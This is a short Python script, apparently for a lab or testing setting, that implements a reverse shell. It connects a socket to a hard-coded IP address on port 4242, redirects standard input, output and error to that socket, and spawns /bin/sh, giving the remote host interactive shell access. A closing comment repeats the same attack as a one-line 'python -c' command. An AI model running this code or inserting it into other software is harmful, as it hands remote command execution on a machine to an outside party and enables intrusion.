import socket
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.138.135", 4242))

os.dup2(s.fileno(), 0) # stdin
os.dup2(s.fileno(), 1) # stdout
os.dup2(s.fileno(), 2) # sderr

pty.spawn("/bin/sh")

# python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.138.135\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'